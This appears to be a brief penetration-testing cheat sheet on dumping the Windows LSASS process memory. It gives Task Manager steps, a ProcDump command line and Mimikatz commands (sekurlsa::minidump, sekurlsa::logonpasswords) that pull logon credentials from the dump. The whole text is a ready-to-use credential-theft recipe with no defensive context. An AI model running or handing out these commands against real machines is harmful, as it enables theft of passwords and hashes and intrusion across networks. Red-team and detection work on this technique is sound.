# Dumping LSASS.exe

Task Manager
```
lsass.exe --> right click --> Create Dump File
```

ProcDump
```
procdump.exe -accepteula -ma lsass.exe lsa.dmp
```
Mimikatz
```
sekurlsa::minidump lsa.dmp
sekurlsa::logonpasswords
```
